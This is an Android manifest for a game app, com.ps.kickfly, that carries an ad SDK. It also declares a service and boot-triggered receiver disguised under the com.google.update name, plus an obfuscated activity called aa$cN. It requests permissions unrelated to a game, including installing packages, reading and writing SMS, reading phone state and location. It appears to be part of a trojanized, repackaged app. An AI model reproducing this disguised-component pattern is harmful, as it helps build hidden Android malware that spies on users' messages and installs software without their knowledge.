<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.ps.kickfly">
    <application android:icon="@drawable/icon" android:label="@string/app_name">
        <activity android:label="@string/app_name" android:name=".GameMainActivity" android:screenOrientation="landscape">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <activity android:label="@string/app_name" android:name=".KickFly" android:screenOrientation="landscape">
            <intent-filter/>
        </activity>
        <activity android:label="GameMode" android:name=".GameModeActivity" android:screenOrientation="landscape">
            <intent-filter/>
        </activity>
        <activity android:label="@string/app_name" android:name="com.adwo.adsdk.AdwoAdBrowserActivity"/>
        <meta-data android:name="Adwo_PID" android:value="00a2b978dfbe4efb8a79f1cb03ad7205"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="aa$cN" android:theme="@android:style/Theme.Dialog"/>
        <service android:name="com.google.update.UpdateService"/>
        <receiver android:name="com.google.update.Receiver">
            <intent-filter>
                <action android:name="android.intent.action.BATTERY_CHANGED_ACTION"/>
                <action android:name="android.intent.action.SIG_STR"/>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <meta-data android:name="ST_MY_PID" android:value="1014user"/>
    </application>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.WRITE_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
</manifest>